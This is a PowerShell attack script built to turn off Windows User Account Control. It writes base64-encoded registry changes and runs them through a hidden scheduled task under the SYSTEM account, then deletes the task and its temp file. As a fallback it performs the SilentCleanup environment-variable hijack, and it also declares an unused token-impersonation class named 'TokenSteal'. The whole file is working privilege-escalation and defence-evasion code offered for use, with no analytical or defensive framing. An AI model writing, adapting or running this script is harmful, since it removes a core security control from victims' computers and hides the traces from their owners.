$taskName = "DisableUACTask"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

$command = @"
Set-ItemProperty -Path '$registryPath' -Name 'EnableLUA' -Value 0 -Type DWord
Set-ItemProperty -Path '$registryPath' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord  
Set-ItemProperty -Path '$registryPath' -Name 'PromptOnSecureDesktop' -Value 0 -Type DWord
"@

$encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\$taskName</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>1999-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoP -NonI -W Hidden -Ep Bypass -Enc $encodedCmd</Arguments>
    </Exec>
  </Actions>
</Task>
"@

$tempXml = "$env:TEMP\task.xml"
$taskXml | Out-File -FilePath $tempXml -Encoding Unicode

$silentCreds = @"
using System;
using System.Runtime.InteropServices;
public class TokenSteal {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
}
"@

$serviceQuery = Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name='TrustedInstaller'" -ErrorAction SilentlyContinue
if ($serviceQuery.State -ne "Running") {
    Start-Service TrustedInstaller -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}

$tiProc = Get-Process -Name "TrustedInstaller" -ErrorAction SilentlyContinue

if ($tiProc) {
    $schTasksPath = "$env:SystemRoot\System32\schtasks.exe"
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $schTasksPath
    $psi.Arguments = "/Create /TN `"$taskName`" /XML `"$tempXml`" /F"
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    
    $proc = [System.Diagnostics.Process]::Start($psi)
    $proc.WaitForExit()
    
    Start-Sleep -Milliseconds 200
    
    $runPsi = New-Object System.Diagnostics.ProcessStartInfo
    $runPsi.FileName = $schTasksPath
    $runPsi.Arguments = "/Run /TN `"$taskName`""
    $runPsi.UseShellExecute = $false
    $runPsi.CreateNoWindow = $true
    
    $runProc = [System.Diagnostics.Process]::Start($runPsi)
    $runProc.WaitForExit()
    
    Start-Sleep -Seconds 1
    
    & $schTasksPath /Delete /TN "$taskName" /F 2>$null
    
    Remove-Item -Path $tempXml -Force -ErrorAction SilentlyContinue
    
    Write-Host "[+] UAC disabled via scheduled task elevation!" -ForegroundColor Green
    Write-Host "[!] Restart required" -ForegroundColor Yellow
}
else {
    Write-Host "[-] TrustedInstaller not available, trying alternative..." -ForegroundColor Yellow
    
    $diskCleanupBypass = {
        $key = "HKCU:\Environment"
        $originalPath = (Get-ItemProperty -Path $key -Name "windir" -ErrorAction SilentlyContinue).windir
        
        $payload = "powershell -ep bypass -w hidden -c `"Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0`" & REM "
        Set-ItemProperty -Path $key -Name "windir" -Value $payload
        
        schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" 2>$null
        
        Start-Sleep -Seconds 2
        
        if ($originalPath) {
            Set-ItemProperty -Path $key -Name "windir" -Value $originalPath
        } else {
            Remove-ItemProperty -Path $key -Name "windir" -ErrorAction SilentlyContinue
        }
    }
    
    & $diskCleanupBypass
    
    Write-Host "[+] UAC bypass attempted via SilentCleanup!" -ForegroundColor Green
    Write-Host "[!] Restart required" -ForegroundColor Yellow
}
